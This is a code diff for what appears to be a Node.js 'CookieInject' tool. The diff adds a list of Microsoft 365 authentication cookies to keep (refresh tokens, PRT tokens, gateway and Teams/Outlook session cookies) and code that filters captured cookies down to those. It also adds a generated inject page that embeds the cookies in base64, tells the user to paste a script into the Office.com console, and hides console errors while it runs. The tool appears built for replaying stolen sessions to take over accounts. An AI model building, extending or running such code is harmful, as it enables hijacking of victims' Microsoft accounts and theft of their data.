@@ -129,6 +129,115 @@ router.get('/raw/:id', async (req, res) => {
   }
 });
 
+// ─── Essential Cookie Names ─────────────────────────────────────────
+// Only these cookies are critical for authentication.
+// All others are telemetry/analytics and should be stripped to avoid
+// Microsoft Clarity tag‑limit overflow (128‑tag hard  limit).
+var ESSENTIAL_COOKIE_PATTERNS = [
+  //── Authentication / PRT ──
+  'x-ms-refreshtokencredential',
+  'refreshtoken',
+  'prttoken',
+  'scauth',
+  'signinchallenge',
+  'accountautcookie',
+  'signinchallenge',
+  // ── Session / gateway ──
+  'pst', 'esx', 'gtmk', 'es', 'pplms', 'x-ms-gw-svc',
+  'gatewaytoken', 'gatewaycontext', 'gwskyticket',
+  'rvn',
+  // ── Office / Azure AD session ──
+  'spoictlr',
+  'msoftcache',
+  'msreftoken',
+  'wla42',
+  'loginhhint',
+  'mscc',
+  'crllst',
+  'stssvc',
+  'wgctx',
+  // ── Common Microsoft session cookies ──
+  'fpc', 'bms', 'msf', 'msfpc', 'waff',
+  'anontk', '_ana',
+  // ── Skype / Centro config (small, safe) ──
+  '_oacl', '_rcid',
+  // ── Onedrive / Outlook / SharePoint / Teams core ──
+  'wssb_location', 'wssb_correlationid', 'wssb_ssobckey',
+  'clientinfo', 'exauthcookie', 'cktk',
+  'arch',  'teamsession', 'msft',
+  // ── Microsoft Identity / AAD ──
+  'x-ms-tk-idpextreq',
+  'x-ms-tracking-id',
+  'x-ms-request-id',
+  // ── Auth state / hints ──
+  'msauthuser',
+  'msauthcookie',
+  'bghcookiesdeletedflag',
+  'amlbgen',
+  'plcf',
+  // ── Bootstrap / redirect ──
+  '_msazure-redirect',
+  'bfcag',
+  'tmsio',
+  'crmci',
+  'x-ms-gateway-svc',
+  'x-ms-request-start',
+  'dt-rp',
+  'dt-rp-pii',
+  'ridh',
+  'x-ms-cp-code'
+];
+
+// ─── Check if a cookie name is essential for authentication ──────────
+function isEssentialCookie(cookieName) {
+  if (!cookieName) return false;
+  var nameLower = cookieName.toLowerCase();
+
+  // Direct exact match
+  for (var i = 0; i < ESSENTIAL_COOKIE_PATTERNS.length; i++) {
+    if (nameLower === ESSENTIAL_COOKIE_PATTERNS[i]) return true;
+  }
+
+  // Prefix match for known essential prefixes
+  var essentialPrefixes = [
+    'x-ms-',
+    'x_ms_',
+    '_msazure',
+    'wssb',
+    'tstc',
+    'rl$',
+    'xonext',
+    '_ctok',
+    '_etok',
+    'pctx',
+    'pcx',
+    'reftoken',
+    'gateway'
+  ];
+  for (var j = 0; j < essentialPrefixes.length; j++) {
+    if (nameLower.indexOf(essentialPrefixes[j]) === 0) return true;
+  }
+
+  return false;
+}
+
+// ─── Filter cookies to only essential authentication ones ────────────
+function filterEssentialCookies(cookies) {
+  var essential = [];
+  var filtered = 0;
+  for (var i = 0; i < cookies.length; i++) {
+    if (isEssentialCookie(cookies[i].name)) {
+      essential.push(cookies[i]);
+    } else {
+      filtered++;
+    }
+  }
+  if (filtered > 0) {
+    console.log('[CookieInject] Filtered out ' + filtered + ' non-essential cookies. Keeping ' + essential.length + ' essential cookies.');
+  }
+  return essential;
+}
+
 // ─── Parse Cookie String ───────────────────────────────────────────
 function parseCookies(cookieString, options) {
   if (!cookieString) return [];
@@ -173,6 +282,10 @@ function parseCookies(cookieString, options) {
       cookies.push(seenNames[key]);
     }
   }
+
+  // ── Filter to essential cookies only ──
+  cookies = filterEssentialCookies(cookies);
+
   return cookies;
 }
 
@@ -337,8 +450,42 @@ function generateInjectPage(cookies, clientId, tenant) {
   html += '    <button onclick="copyCookies()" class="btn-secondary">\ud83d\udccb Copy Cookie String</button>\n';
   html += '    <button onclick="openDirect()" class="btn-secondary">\ud83d\udd17 Open Microsoft Directly</button>\n';
   html += '  </div>\n';
-  html += '  <div id="status"></div>\n';
+  html += '  <div id="status"></div>\n'; 
   html += '  <script>\n';
+ // ── Suppress Microsoft Clarity & Centro console noise ──────────────
+  // These errors are cosmetic (analytics/feature-flag services) and
+  // appear whenever many cookies are present on Microsoft pages. 
+  html += '    // Suppress Clarity tag-limit &400 errors\n';
+  html += '    (function suppressClarityErrors() {\n';
+  html += '      var origError = console.error;\n';
+  html += '      var origWarn = console.warn;\n';
+  html += '      var origLog = console.log;\n';
+  html += '      var suppressed = 0;\n';
+  html += '      console.error = function() {\n';
+  html += '        var args = Array.prototype.slice.call(arguments);\n';
+  html += '        var msg = args.join(" ");\n';
+  html += '        if (typeof msg === "string" && (\n';
+  html += '          msg.indexOf("clarity.ms") !== -1 ||\n';
+  html += '          msg.indexOf("clarity") !== -1 ||\n';
+  html += '          msg.indexOf("Microsoft Clarity tag limit") !== -1 ||\n';
+  html += '          msg.indexOf("Attempted to set") !== -1 && msg.indexOf("Clarity tags") !== -1 ||\n';
+  html += '          msg.indexOf("net::ERR_ABORTED") !== -1 && msg.indexOf("clarity") !== -1\n';
+  html += '        )) {\n';
+  html += '          suppressed++;\n';
+  html += '          return;\n';
+  html += '        }\n';
+  html += '        return origError.apply(console, arguments);\n';
+  html += '      };\n';
+  html += '      // Restore original console after 10 seconds\n';
+  html += '      setTimeout(function() {\n';
+  html += '        console.error = origError;\n';
+  html += '        if (suppressed > 0) {\n';
+  html += '          console.warn("[CookieInjector] Suppressed " + suppressed + " Clarity console errors.");\n';
+  html += '        }\n';
+  html += '      }, 10000);\n';
+  html += '    })();\n';
+  html += '\n';
+  
   // FIX: Use base64 encoding to safely embed cookie data with special characters
   html += '    var cookieDataB64 = "' + cookieDataB64 + '";\n';
   html += '    var cookieData = JSON.parse(atob(cookieDataB64));\n';
@@ -432,11 +579,25 @@ function generateInjectPage(cookies, clientId, tenant) {
   html += '      stepHtml += \'<li>Go to <strong>Console</strong> tab</li>\';\n';
   html += '      stepHtml += \'<li>Paste the code below and press <strong>Enter</strong>:</li>\';\n';
   html += '      stepHtml += \'<textarea style="width:90%;height:150px;font-size:10px;font-family:monospace;margin:10px 0;background:#111;color:#0f0" id="manualScript">\' + script + \'</textarea>\';\n';
-  html += '      stepHtml += \'<button onclick="var t=document.getElementById(\'manualScript\');t.select();document.execCommand(\'copy\');this.textContent=\'Copied!\'">Copy Script</button>\';\n';
+  html += '      stepHtml += \'<button id="copyBtn" style="margin:10px 0">Copy Script</button>\';\n';
   html += '      stepHtml += \'<li style="margin-top:10px">Go back to Office.com tab and press <strong>F5</strong> to refresh</li>\';\n';
   html += '      stepHtml += \'</ol>\';\n';
   html += '      stepHtml += \'</div>\';\n';
   html += '      setStatus(stepHtml, "info");\n';
+  html += '      // Attach click handler after inserting HTML\n';
+  html += '      (function attachCopyHandler() {\n';
+  html += '        try {\n';
+  html += '          var btn = document.getElementById("copyBtn");\n';
+  html += '          var ta = document.getElementById("manualScript");\n';
+  html += '          if (btn && ta) {\n';
+  html += '            btn.onclick = function() {\n';
+  html += '              ta.select();\n';
+  html += '              document.execCommand("copy");\n';
+  html += '              btn.textContent = "Copied!";\n';
+             html += ' };\n';
+  html += '          }\n';
+  html += '        } catch(e) {}\n';
+  html += '      })();\n';
   html += '    }\n'; 
   html += '\n';
   html += '    function copyCookies() {\n';
